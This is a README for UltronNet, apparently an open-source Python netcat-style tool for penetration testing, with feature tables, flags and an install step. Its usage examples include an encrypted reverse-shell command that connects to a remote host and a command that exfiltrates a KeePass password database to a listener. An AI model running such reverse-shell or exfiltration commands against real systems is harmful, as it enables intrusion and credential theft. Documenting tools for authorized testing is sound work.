# UltronNet v2.1 

**Advanced Network Swiss Army Knife & Encrypted Transport Engine** — Python 3.8+

[![Architecture: Modular Package](https://img.shields.io/badge/Architecture-Modular_Package-blue.svg)](ultronnet/)
[![Platform: Linux / macOS / Windows](https://img.shields.io/badge/Platform-Linux%20%7C%20macOS%20%7C%20Windows-green.svg)]()
[![License: Open-Source](https://img.shields.io/badge/License-MIT-orange.svg)]()

---

##  Features

| # | Feature | Capability | Status |
|---|---------|------------|--------|
| 1 | **Multi-Protocol Engine** | Native TCP & UDP socket operations with automatic IPv4/IPv6 resolution | ✅ |
| 2 | **Transport Security** | SSL/TLS in-memory encryption with automated self-signed certificate generation | ✅ |
| 3 | **Interactive PTY Shell** | Fully interactive POSIX PTY allocation (`pty.fork`, `termios` raw mode, `SIGWINCH` resize) | ✅ Linux/macOS |
| 4 | **Pivoting & Tunnels** | High-performance bidirectional threaded TCP port forwarding | ✅ |
| 5 | **File Transport** | Framed streaming file upload/download with dynamic progress tracking (`tqdm`) | ✅ |
| 6 | **Network Resilience** | Graceful socket shutdown (`SHUT_RDWR`), timeout handling, and exponential backoff auto-reconnect | ✅ |

---

##  Installation & Setup

Install UltronNet in editable development mode to register the `ultronnet` command system-wide:

```bash
git clone https://github.com/0xZiki/UltronNet.git
cd UltronNet
pip install -e . --break-system-packages
```

---

##  Usage

You can run UltronNet directly from anywhere in your terminal via the installed binary, or execute the root runner:

```bash
# Direct system command (recommended)
ultronnet [OPTIONS]

# Or via the root wrapper
./UltronNet.py [OPTIONS]
```

### Connection Flags
| Flag | Description |
|------|-------------|
| `-t HOST` | Target host (default: `0.0.0.0`) |
| `-p PORT` | Target port (default: `4444`) |
| `-l` | Enable Listener mode |
| `--udp` | Use UDP transport instead of TCP |
| `--ipv6` | Force IPv6 address resolution |
| `--reconnect` | Auto-reconnect on socket failure (max 5 attempts with backoff) |

### Operation Modes
| Flag | Description |
|------|-------------|
| `-c` | Interactive command shell |
| `--pty` | Full POSIX PTY shell (Tab completion, signals, vim support) |
| `-e "CMD"` | Execute command upon connection and pipe output |
| `-u PATH` | Receive and save inbound file to target PATH |
| `--send-file PATH` | Stream and upload local file to remote listener |
| `--forward HOST:PORT` | Spawn bidirectional threaded port forwarding relay |

### Cryptographic Security (SSL/TLS)
| Flag | Description |
|------|-------------|
| `--ssl` | Enforce full SSL/TLS encryption (auto-generates in-memory self-signed cert if none provided) |
| `--cert FILE` | Path to custom PEM certificate |
| `--key FILE` | Path to custom private key |

---

##  Practical Examples

```bash
# 1. Spawn a full interactive PTY listener
ultronnet -l -p 4444 --pty

# 2. Encrypted TLS C2 reverse shell
ultronnet -t 192.168.1.50 -p 4444 -c --ssl

# 3. Bidirectional Port Forwarding (8080 local -> 192.168.1.10:80)
ultronnet -l -p 8080 --forward 192.168.1.10:80

# 4. Stream exfiltrate file with progress tracking
# On Receiver:
ultronnet -l -p 9000 -u received_db.kdbx
# On Sender:
ultronnet -t 10.10.10.5 -p 9000 --send-file target_db.kdbx

# 5. Resilient UDP listener
ultronnet -l -p 5353 --udp
```

---

##  Modular Architecture (v2.1)

```text
UltronNet/
├── UltronNet.py              ← Top-level standalone executable runner
├── setup.py                  ← Package definition & console_scripts entrypoint
├── docs/
│   └── UltronNet-Interview-Dossier.md ← Exhaustive technical & syscall retention dossier
└── ultronnet/                ← Core modular package
    ├── config.py             ← Configuration dataclass & singleton defaults
    ├── logging_setup.py      ← Thread-safe logging configuration
    ├── core/                 ← Foundational network primitives
    │   ├── socket_utils.py   ← detect_af, safe_close (SHUT_RDWR), recv_exactly
    │   └── engine.py         ← Main NetCat connection lifecycle & dispatch
    ├── crypto/               ← Cryptographic layer
    │   └── manager.py        ← CryptoManager & dynamic in-memory X.509 cert generation
    ├── features/             ← Modular operational capabilities
    │   ├── pty_handler.py    ← POSIX openpty, termios raw-mode & signals
    │   ├── port_forwarder.py ← Multithreaded cross-socket relay piping
    │   ├── file_transfer.py  ← Chunked framing & progress tracker (tqdm fallback)
    │   ├── executor.py       ← Subprocess execution handlers
    │   └── shell.py          ← Command shell loop & dumb-shell dispatch
    └── cli/                  ← User interface & argument orchestration
        └── parser.py         ← build_parser & validation routines
```

---

##  Legal Disclaimer

> This tool is developed for **authorized penetration testing, red teaming operations, and educational research only**.  
> Unauthorized use against target systems without explicit prior written consent is strictly prohibited.
